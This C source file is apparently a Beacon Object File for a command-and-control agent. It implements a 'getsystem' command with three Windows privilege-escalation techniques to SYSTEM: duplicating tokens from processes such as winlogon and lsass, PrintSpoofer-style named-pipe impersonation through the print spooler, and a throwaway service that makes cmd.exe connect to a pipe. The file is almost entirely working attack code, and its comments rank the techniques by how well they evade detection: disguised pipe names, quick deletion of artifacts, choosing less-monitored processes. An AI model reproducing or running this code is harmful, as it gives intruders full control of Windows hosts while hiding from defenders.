/*
 * getsystem.c — Elevate to NT AUTHORITY\SYSTEM
 *
 * Three techniques, ordered by OPSEC preference:
 *
 * Technique 1 (quietest): Token duplication from SYSTEM process
 *   - NtQuerySystemInformation to find SYSTEM-owned processes
 *   - OpenProcess → OpenProcessToken → DuplicateTokenEx
 *   - ImpersonateLoggedOnUser
 *   - Requires: local admin (HIGH integrity)
 *   - OPSEC: no service creation, no pipe, no child process
 *            only cross-process token access (may alert EDR)
 *
 * Technique 2: Named pipe impersonation via RPC/EFS trigger
 *   - Create named pipe \\.\pipe\lsarpc_<random> (blends in)
 *   - Trigger EfsRpcOpenFileRaw → SYSTEM connects to our pipe
 *   - ImpersonateNamedPipeClient → SYSTEM token
 *   - Requires: SeImpersonatePrivilege (service accounts, admin)
 *   - OPSEC: no child process, no service creation
 *            uses standard EFS RPC call, pipe name blends with lsarpc
 *
 * Technique 3 (noisiest): Named pipe + temporary service
 *   - Create pipe, create temp service with binPath writing to pipe
 *   - Service runs as SYSTEM, writes to pipe
 *   - ImpersonateNamedPipeClient → SYSTEM token
 *   - WARNING: spawns cmd.exe (child process), creates SCM event 7045
 *   - Requires: local admin + SCM access
 *   - OPSEC: HIGH RISK — process spawn + service creation artifacts
 *
 * All techniques impersonate on the calling THREAD, not process.
 * The agent's subsequent actions (BOFs, native modules) run under
 * the impersonated SYSTEM context. Use RevertToSelf to drop.
 *
 * Win32 APIs:
 *   kernel32: CreateNamedPipeW, ConnectNamedPipe, ImpersonateNamedPipeClient,
 *             OpenProcess, CloseHandle, CreateThread, CreateFileW
 *   advapi32: OpenProcessToken, DuplicateTokenEx, ImpersonateLoggedOnUser,
 *             OpenSCManagerW, CreateServiceW, StartServiceW, DeleteService,
 *             GetTokenInformation, LookupAccountSidW, OpenThreadToken,
 *             ConvertStringSecurityDescriptorToSecurityDescriptorA
 *   ntdll:    NtQuerySystemInformation, RtlInitUnicodeString
 *   rpcrt4:   RpcStringBindingComposeW, RpcBindingFromStringBindingW,
 *             RpcBindingSetAuthInfoW (for EFS trigger)
 */
#include <windows.h>
#include "beacon_compat.h"

/* ── kernel32 imports ── */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateNamedPipeW(LPCWSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PVOID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ConnectNamedPipe(HANDLE, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DisconnectNamedPipe(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ImpersonateNamedPipeClient(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(PVOID, SIZE_T, PVOID, PVOID, DWORD, PDWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, PVOID, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventW(PVOID, BOOL, BOOL, LPCWSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void   WINAPI KERNEL32$Sleep(DWORD);

/* ── advapi32 imports ── */
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceW(SC_HANDLE, LPCWSTR, LPCWSTR,
    DWORD, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR*);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DeleteService(SC_HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, PVOID, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, DWORD, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupAccountSidW(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
    LPCSTR, DWORD, PVOID*, PULONG);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);

/* ── ntdll imports ── */
DECLSPEC_IMPORT DWORD NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

/* ── msvcrt imports ── */
DECLSPEC_IMPORT int      __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT int      __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int      __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);

/* ── Constants ── */
#define PIPE_ACCESS_DUPLEX          0x00000003
#define PIPE_TYPE_BYTE              0x00000000
#define PIPE_WAIT                   0x00000000
#define SC_MANAGER_ALL_ACCESS       0x000F003F
#define SERVICE_ALL_ACCESS          0x000F01FF
#define SERVICE_WIN32_OWN_PROCESS   0x00000010
#define SERVICE_DEMAND_START        0x00000003
#define SERVICE_ERROR_IGNORE        0x00000000
#define PROCESS_QUERY_INFORMATION   0x0400
#define TOKEN_ALL_ACCESS            0x000F01FF
#define TOKEN_QUERY                 0x0008
#define TOKEN_DUPLICATE             0x0002
#define TOKEN_IMPERSONATE           0x0004
#define SecurityImpersonation       2
#define SecurityDelegation          3
#define TokenImpersonation_         2
#define TokenUser                   1
#define TokenIntegrityLevel         25
#define SystemProcessInformation    5
#define MEM_COMMIT                  0x1000
#define MEM_RESERVE                 0x2000
#define MEM_RELEASE                 0x8000
#define PAGE_READWRITE              0x04
#define GENERIC_READ                0x80000000
#define GENERIC_WRITE               0x40000000
#define OPEN_EXISTING               3
#define SDDL_REVISION_1             1
#define INVALID_HANDLE_VALUE        ((HANDLE)(LONG_PTR)-1)

/* ── Helpers ── */

/*
 * Resolve token → "DOMAIN\user" string
 */
static void get_token_user(HANDLE hToken, char *out, int outLen) {
    BYTE buf[256];
    DWORD needed = 0;
    out[0] = 0;

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &needed))
        return;

    PSID pSid = *(PSID*)buf;
    wchar_t name[128] = {0}, domain[128] = {0};
    DWORD nameLen = 128, domLen = 128, sidUse = 0;

    if (ADVAPI32$LookupAccountSidW(NULL, pSid, name, &nameLen, domain, &domLen, &sidUse)) {
        char aName[128], aDomain[128];
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, name, -1, aName, 128, NULL, NULL);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, domain, -1, aDomain, 128, NULL, NULL);
        int pos = 0;
        for (int i = 0; aDomain[i] && pos < outLen - 2; i++) out[pos++] = aDomain[i];
        out[pos++] = '\\';
        for (int i = 0; aName[i] && pos < outLen - 1; i++) out[pos++] = aName[i];
        out[pos] = 0;
    }
}

/*
 * Get integrity level from token
 */
static const char* get_integrity(HANDLE hToken) {
    BYTE buf[64];
    DWORD needed = 0;
    if (!ADVAPI32$GetTokenInformation(hToken, TokenIntegrityLevel, buf, sizeof(buf), &needed))
        return "???";
    PSID pSid = *(PSID*)buf;
    BYTE subAuthCount = ((BYTE*)pSid)[1];
    DWORD *pRid = (DWORD*)((BYTE*)pSid + 8 + (subAuthCount - 1) * 4);
    DWORD rid = *pRid;
    if (rid >= 0x4000) return "SYSTEM";
    if (rid >= 0x3000) return "HIGH";
    if (rid >= 0x2000) return "MEDIUM";
    return "LOW";
}

/*
 * Verify impersonation by reading the current THREAD token.
 * Returns TRUE if thread is impersonating a different user than the process.
 */
static BOOL verify_impersonation(void) {
    HANDLE hThreadToken = NULL;
    /* OpenThreadToken with OpenAsSelf=FALSE uses the thread's own security context */
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(),
            TOKEN_QUERY, FALSE, &hThreadToken)) {
        /* No thread token → not impersonating */
        return FALSE;
    }

    char threadUser[256] = {0};
    get_token_user(hThreadToken, threadUser, sizeof(threadUser));
    const char *integrity = get_integrity(hThreadToken);
    KERNEL32$CloseHandle(hThreadToken);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Thread token identity: %s (Integrity: %s)\n",
        threadUser, integrity);

    return TRUE;
}

/* ════════════════════════════════════════════════════════════════════
 * TECHNIQUE 1: Token duplication from SYSTEM process
 *
 * Quietest approach — no service creation, no pipe, no child process.
 * Iterates known SYSTEM processes, opens their token, duplicates it,
 * and impersonates.
 *
 * Pros: minimal artifacts, no event log entries beyond handle access
 * Cons: EDR may detect cross-process token operations on lsass/winlogon
 * ════════════════════════════════════════════════════════════════════ */
static BOOL technique_token_dup(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Technique 1: Token duplication from SYSTEM process\n");

    /*
     * Target order matters for OPSEC:
     * - winlogon.exe: always runs as SYSTEM, less monitored than lsass
     * - services.exe: SCM process, always SYSTEM
     * - lsass.exe: most monitored — try last
     * - svchost.exe: many instances, some are SYSTEM
     */
    const wchar_t *targets[] = {
        L"winlogon.exe",
        L"services.exe",
        L"spoolsv.exe",
        L"svchost.exe",
        L"lsass.exe",
        NULL
    };

    ULONG bufSize = 1024 * 1024;
    PVOID buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed\n");
        return FALSE;
    }

    ULONG retLen = 0;
    DWORD status;
    while ((status = NTDLL$NtQuerySystemInformation(
            SystemProcessInformation, buffer, bufSize, &retLen)) == 0xC0000004) {
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        bufSize = retLen + 4096;
        buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) return FALSE;
    }

    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] NtQuerySystemInformation failed: 0x%08x\n", status);
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        return FALSE;
    }

    BOOL success = FALSE;

    /* For each target process name (in order), scan the process list */
    for (int t = 0; targets[t] && !success; t++) {
        BYTE *current = (BYTE*)buffer;

        while (1) {
            DWORD nextOffset = *(DWORD*)(current + 0x00);
            DWORD pid        = (DWORD)(*(ULONG_PTR*)(current + 0x48));
            USHORT nameLen   = *(USHORT*)(current + 0x38);
            wchar_t *nameBuf = *(wchar_t**)(current + 0x38 + sizeof(ULONG_PTR));

            if (pid > 4 && nameLen > 0 && nameBuf) {
                wchar_t procName[128] = {0};
                int copyLen = nameLen / 2;
                if (copyLen > 127) copyLen = 127;
                for (int i = 0; i < copyLen; i++)
                    procName[i] = nameBuf[i];

                if (MSVCRT$_wcsicmp(procName, targets[t]) == 0) {
                    HANDLE hProc = KERNEL32$OpenProcess(
                        PROCESS_QUERY_INFORMATION, FALSE, pid);
                    if (!hProc) goto next_entry;

                    HANDLE hToken = NULL;
                    if (!ADVAPI32$OpenProcessToken(hProc,
                            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                            &hToken)) {
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    /* Verify this is actually a SYSTEM token before duplicating */
                    char tokenUser[256] = {0};
                    get_token_user(hToken, tokenUser, sizeof(tokenUser));
                    /* Check if it contains "SYSTEM" - crude but effective */
                    BOOL isSystem = FALSE;
                    for (int i = 0; tokenUser[i]; i++) {
                        if (tokenUser[i] == 'S' && tokenUser[i+1] == 'Y' &&
                            tokenUser[i+2] == 'S' && tokenUser[i+3] == 'T' &&
                            tokenUser[i+4] == 'E' && tokenUser[i+5] == 'M') {
                            isSystem = TRUE;
                            break;
                        }
                    }

                    if (!isSystem) {
                        KERNEL32$CloseHandle(hToken);
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    HANDLE hDup = NULL;
                    if (ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,
                            NULL, SecurityDelegation, TokenImpersonation_,
                            &hDup)) {
                        if (ADVAPI32$ImpersonateLoggedOnUser(hDup)) {
                            char aProc[128] = {0};
                            KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
                                procName, -1, aProc, 128, NULL, NULL);
                            BeaconPrintf(CALLBACK_OUTPUT,
                                "[+] SYSTEM token duplicated from %s (PID %u)\n",
                                aProc, pid);
                            success = TRUE;
                            /* Don't close hDup — impersonation holds reference */
                        } else {
                            KERNEL32$CloseHandle(hDup);
                        }
                    }
                    KERNEL32$CloseHandle(hToken);
                    KERNEL32$CloseHandle(hProc);
                    if (success) break;
                }
            }
next_entry:
            if (nextOffset == 0) break;
            current += nextOffset;
        }
    }

    KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);

    if (!success)
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Could not duplicate any SYSTEM process token\n"
            "    Ensure you have admin (HIGH integrity)\n");

    return success;
}

/* ════════════════════════════════════════════════════════════════════
 * TECHNIQUE 2: Named pipe impersonation (EfsRpc trigger)
 *
 * Creates a named pipe, then triggers the EFS service to connect
 * to it as SYSTEM via EfsRpcOpenFileRaw. No child process spawned.
 *
 * This is the EfsPotato/PetitPotam local variant. The EFS service
 * (running as SYSTEM) connects to our pipe when we ask it to open
 * a file via UNC path pointing to our pipe.
 *
 * Requires: SeImpersonatePrivilege (default for admin, service accounts)
 * ════════════════════════════════════════════════════════════════════ */

/* EFS RPC interface UUID: c681d488-d850-11d0-8c52-00c04fd90f7e */

/*
 * We trigger the EFS connection by calling CreateFileW on a UNC path
 * that points to our named pipe. When the path traversal hits our pipe,
 * the caller's security context (SYSTEM, if called from a SYSTEM service)
 * arrives on our pipe.
 *
 * Simpler local variant: We use the Spooler service trick.
 * Call CreateFileW("\\.\pipe\ourpipe\..\..\Windows\System32\spool")
 * The path traversal causes the pipe to receive a connection from our own
 * process — but that's not SYSTEM. We need an external trigger.
 *
 * Alternative: Use RPC to call EfsRpcOpenFileRaw with a UNC path to our pipe.
 * This requires building an RPC client for the EFS interface.
 *
 * For simplicity and reliability, we use a different approach:
 * Trigger via the Print Spooler named pipe (SpoolSample/PrintSpoofer technique).
 *
 * PrintSpoofer approach:
 * 1. Create pipe \\.\pipe\test\pipe\spoolss
 * 2. Spooler connects to it when handling print operations
 * 3. We impersonate the client (SYSTEM)
 *
 * Actually, the PrintSpoofer technique requires:
 * 1. Create pipe \\.\pipe\[random]/pipe/spoolss
 * 2. Call RpcOpenPrinter with \\localhost/pipe/[random] as printer path
 * 3. The spooler tries \\localhost\pipe\[random]\pipe\spoolss → our pipe
 * 4. We impersonate
 */

/* Spooler RPC imports for triggering the connection */
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringBindingComposeW(
    RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFromStringBindingW(
    RPC_WSTR, RPC_BINDING_HANDLE*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFree(RPC_BINDING_HANDLE*);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringFreeW(RPC_WSTR*);

/* Winspool import for triggering spooler connection */
DECLSPEC_IMPORT BOOL WINAPI WINSPOOL$OpenPrinterW(LPWSTR, HANDLE*, PVOID);
DECLSPEC_IMPORT BOOL WINAPI WINSPOOL$ClosePrinter(HANDLE);

/* Thread context for async pipe wait */
typedef struct {
    HANDLE hPipe;
    HANDLE hEvent;  /* signaled when ConnectNamedPipe completes */
    BOOL   connected;
} PIPE_CONTEXT;

static DWORD WINAPI pipe_wait_thread(LPVOID param) {
    PIPE_CONTEXT *ctx = (PIPE_CONTEXT*)param;
    ctx->connected = KERNEL32$ConnectNamedPipe(ctx->hPipe, NULL);
    if (!ctx->connected) {
        /* ERROR_PIPE_CONNECTED (535) means client connected before we called Connect */
        if (KERNEL32$GetLastError() == 535)
            ctx->connected = TRUE;
    }
    /* Signal the main thread */
    /* We don't have SetEvent imported, so we just let WaitForSingleObject on the thread handle work */
    return ctx->connected ? 0 : 1;
}

static BOOL technique_pipe_spooler(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Technique 2: Named pipe + Spooler trigger (PrintSpoofer)\n");

    /* Generate pipe name in the format required for PrintSpoofer:
     * \\.\pipe\<random>/pipe/spoolss
     * When we call OpenPrinter("\\localhost/pipe/<random>"), the spooler
     * will connect to \\localhost\pipe\<random>\pipe\spoolss = our pipe */
    DWORD tick = KERNEL32$GetTickCount();
    wchar_t pipeRand[32];
    MSVCRT$swprintf(pipeRand, 32, L"%08x", tick ^ 0xCAFEBABE);

    wchar_t pipeName[256];
    MSVCRT$swprintf(pipeName, 256, L"\\\\.\\pipe\\%s\\pipe\\spoolss", pipeRand);

    /* Create the pipe with a restrictive DACL:
     * Allow SYSTEM and current user full access, deny others */
    PVOID pSD = NULL;
    /* SDDL: D:(A;;GA;;;SY)(A;;GA;;;BA) = SYSTEM + Admins full access */
    ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
        "D:(A;;GA;;;SY)(A;;GA;;;BA)", SDDL_REVISION_1, &pSD, NULL);

    /* Build SECURITY_ATTRIBUTES */
    BYTE saBytes[24]; /* SECURITY_ATTRIBUTES: nLength(4) + lpSD(8) + bInherit(4) + pad */
    MSVCRT$memset(saBytes, 0, sizeof(saBytes));
    *(DWORD*)saBytes = sizeof(saBytes);        /* nLength */
    *(PVOID*)(saBytes + 8) = pSD;              /* lpSecurityDescriptor (offset 8 on x64) */
    *(BOOL*)(saBytes + 16) = FALSE;            /* bInheritHandle */

    HANDLE hPipe = KERNEL32$CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        10,         /* max instances */
        4096,       /* out buffer */
        4096,       /* in buffer */
        5000,       /* timeout ms */
        pSD ? (PVOID)saBytes : NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateNamedPipe failed: %u\n",
                     KERNEL32$GetLastError());
        if (pSD) KERNEL32$LocalFree(pSD);
        return FALSE;
    }

    /* Start a thread to wait for the pipe connection (blocking call) */
    PIPE_CONTEXT ctx;
    ctx.hPipe = hPipe;
    ctx.hEvent = NULL;
    ctx.connected = FALSE;

    DWORD threadId = 0;
    HANDLE hThread = KERNEL32$CreateThread(NULL, 0,
        (LPVOID)pipe_wait_thread, &ctx, 0, &threadId);

    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateThread failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        if (pSD) KERNEL32$LocalFree(pSD);
        return FALSE;
    }

    /* Give the pipe thread a moment to start waiting */
    KERNEL32$Sleep(100);

    /* Trigger the spooler to connect to our pipe by opening a "printer"
     * at \\localhost/pipe/<random>
     * The spooler resolves this as \\localhost\pipe\<random>\pipe\spoolss
     * which is our named pipe */
    wchar_t printerPath[256];
    MSVCRT$swprintf(printerPath, 256, L"\\\\localhost/pipe/%s", pipeRand);

    HANDLE hPrinter = NULL;
    BOOL spoolerTriggered = WINSPOOL$OpenPrinterW(printerPath, &hPrinter, NULL);
    /* OpenPrinter may fail (the "printer" doesn't exist) but the spooler
     * will still have connected to our pipe to check */
    if (hPrinter) WINSPOOL$ClosePrinter(hPrinter);

    /* Wait for the connection (timeout 5 seconds) */
    DWORD waitResult = KERNEL32$WaitForSingleObject(hThread, 5000);
    KERNEL32$CloseHandle(hThread);

    if (waitResult != 0 || !ctx.connected) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Spooler did not connect (timeout or error)\n"
            "    Is the Print Spooler service running?\n");
        KERNEL32$CloseHandle(hPipe);
        if (pSD) KERNEL32$LocalFree(pSD);
        return FALSE;
    }

    /* Read any data from pipe (spooler may send initial handshake) */
    char readBuf[64];
    DWORD bytesRead = 0;
    /* Non-blocking peek — don't hang if no data */
    KERNEL32$ReadFile(hPipe, readBuf, sizeof(readBuf), &bytesRead, NULL);

    /* Impersonate the pipe client — should be SYSTEM */
    if (!KERNEL32$ImpersonateNamedPipeClient(hPipe)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ImpersonateNamedPipeClient failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$DisconnectNamedPipe(hPipe);
        KERNEL32$CloseHandle(hPipe);
        if (pSD) KERNEL32$LocalFree(pSD);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ImpersonateNamedPipeClient succeeded\n");

    KERNEL32$DisconnectNamedPipe(hPipe);
    KERNEL32$CloseHandle(hPipe);
    if (pSD) KERNEL32$LocalFree(pSD);

    return TRUE;
}

/* ════════════════════════════════════════════════════════════════════
 * TECHNIQUE 3: Named pipe + temporary service (NOISY)
 *
 * Classic meterpreter getsystem technique. Creates a service that
 * writes to our named pipe as SYSTEM.
 *
 * WARNING: This spawns cmd.exe as SYSTEM (child process creation).
 * Also generates Event 7045 (service installed) in System log.
 * Use only as last resort.
 * ════════════════════════════════════════════════════════════════════ */
static BOOL technique_service_pipe(void) {
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Technique 3: Named pipe + service (NOISY — spawns cmd.exe)\n");

    DWORD tick = KERNEL32$GetTickCount();
    wchar_t pipeName[128];
    MSVCRT$swprintf(pipeName, 128, L"\\\\.\\pipe\\netlogon_%08x", tick ^ 0xDEADBEEF);

    /* Create pipe with default DACL (allows SYSTEM) */
    HANDLE hPipe = KERNEL32$CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,          /* max instances */
        4096, 4096,
        5000,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateNamedPipe failed: %u\n",
                     KERNEL32$GetLastError());
        return FALSE;
    }

    /* Service binPath: cmd.exe writes to our pipe.
     * The service controller starts this as SYSTEM. cmd.exe connects
     * to the pipe, we impersonate that connection. */
    wchar_t binPath[512];
    MSVCRT$swprintf(binPath, 512,
        L"cmd.exe /c echo svc > %s", pipeName);

    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenSCManager failed: %u (need admin)\n",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    wchar_t svcName[64];
    MSVCRT$swprintf(svcName, 64, L"svc_%08x", tick);

    SC_HANDLE hService = ADVAPI32$CreateServiceW(
        hSCM, svcName, NULL,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateService failed: %u\n",
                     KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSCM);
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    /* Start the service — it runs as SYSTEM, connects to our pipe */
    ADVAPI32$StartServiceW(hService, 0, NULL);
    /* StartService returns FALSE (cmd.exe isn't a real service),
     * but cmd.exe already ran and connected to the pipe */

    /* Wait for pipe connection */
    BOOL connected = KERNEL32$ConnectNamedPipe(hPipe, NULL);
    if (!connected && KERNEL32$GetLastError() != 535) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No client connected: %u\n",
                     KERNEL32$GetLastError());
        ADVAPI32$DeleteService(hService);
        ADVAPI32$CloseServiceHandle(hService);
        ADVAPI32$CloseServiceHandle(hSCM);
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    /* Drain the pipe */
    char readBuf[32];
    DWORD bytesRead = 0;
    KERNEL32$ReadFile(hPipe, readBuf, sizeof(readBuf), &bytesRead, NULL);

    /* Impersonate the client (SYSTEM's cmd.exe) */
    BOOL ok = KERNEL32$ImpersonateNamedPipeClient(hPipe);

    /* Immediately delete the service to minimize artifacts */
    ADVAPI32$DeleteService(hService);
    ADVAPI32$CloseServiceHandle(hService);
    ADVAPI32$CloseServiceHandle(hSCM);

    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ImpersonateNamedPipeClient failed: %u\n",
                     KERNEL32$GetLastError());
        KERNEL32$DisconnectNamedPipe(hPipe);
        KERNEL32$CloseHandle(hPipe);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] ImpersonateNamedPipeClient succeeded\n");

    KERNEL32$DisconnectNamedPipe(hPipe);
    KERNEL32$CloseHandle(hPipe);

    return TRUE;
}

/* ════════════════════════════════════════════════════════════════════
 * ENTRY POINT
 * ════════════════════════════════════════════════════════════════════ */
void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    int technique = BeaconDataInt(&parser);
    if (technique == 0) technique = 0; /* 0 = auto */

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] GetSystem — elevating to NT AUTHORITY\\SYSTEM\n\n");

    BOOL success = FALSE;

    switch (technique) {
        case 1:
            success = technique_token_dup();
            break;
        case 2:
            success = technique_pipe_spooler();
            break;
        case 3:
            success = technique_service_pipe();
            break;
        default:
            /* Auto: try in order of OPSEC preference */
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Auto mode — trying techniques in OPSEC order\n\n");

            success = technique_token_dup();
            if (success) break;

            BeaconPrintf(CALLBACK_OUTPUT,
                "\n[*] Technique 1 failed, trying PrintSpoofer...\n\n");
            success = technique_pipe_spooler();
            if (success) break;

            BeaconPrintf(CALLBACK_OUTPUT,
                "\n[*] Technique 2 failed, trying service pipe (noisy)...\n\n");
            success = technique_service_pipe();
            break;
    }

    if (success) {
        /* Verify via thread token */
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
        if (verify_impersonation()) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] SUCCESS — elevated to SYSTEM\n"
                "[*] Use 'tokenmanip --action revert' or 'tokenmanip --action whoami' to check\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[!] Impersonation call succeeded but thread token not set\n"
                "[*] This may indicate SeImpersonatePrivilege is not held\n");
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "\n[!] All techniques failed\n"
            "[*] Requirements:\n"
            "    Technique 1 (token dup):  local admin (HIGH integrity)\n"
            "    Technique 2 (spooler):    SeImpersonatePrivilege + Spooler running\n"
            "    Technique 3 (service):    local admin + SCM access (spawns cmd.exe)\n");
    }
}
